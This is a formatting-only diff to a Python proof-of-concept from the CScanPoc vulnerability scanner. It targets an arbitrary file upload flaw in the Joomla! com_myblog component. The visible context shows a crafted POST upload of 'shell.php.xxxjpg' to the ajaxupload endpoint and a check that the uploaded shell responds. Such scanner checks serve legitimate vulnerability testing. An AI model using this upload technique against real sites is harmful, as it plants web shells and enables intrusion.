@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Joomla_0011' # 平台漏洞编号，留空
+    vuln_id = 'Joomla_0011'  # 平台漏洞编号，留空
     name = 'Joomla! com_Myblog Arbitrary File Upload Vulnerability'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-07-20'  # 漏洞公布时间
     desc = '''
         /index.php?option=com_myblog&task=ajaxupload 存在文件上传漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Joomla!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '263cb6ec-cde9-4ca0-91d2-9eb3eda0db5f'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             raw = '''POST /index.php?option=com_myblog&task=ajaxupload HTTP/1.1
 Host: www.baidu.com
@@ -51,9 +53,9 @@ Content-Type: application/octet-stream
             if 'shell.php.xxxjpg' in res:
                 shell = re.findall(r"source: '(.+)'", res)
                 if shell:
-                    code, head,res, errcode, _ = hh.http(verity_url)
+                    code, head, res, errcode, _ = hh.http(verity_url)
                     if 'e369853df766fa44e1ed0ff613f563bd' in res:
-                        #security_hole(shell[0])
+                        # security_hole(shell[0])
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
 
@@ -62,6 +64,7 @@ Content-Type: application/octet-stream
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
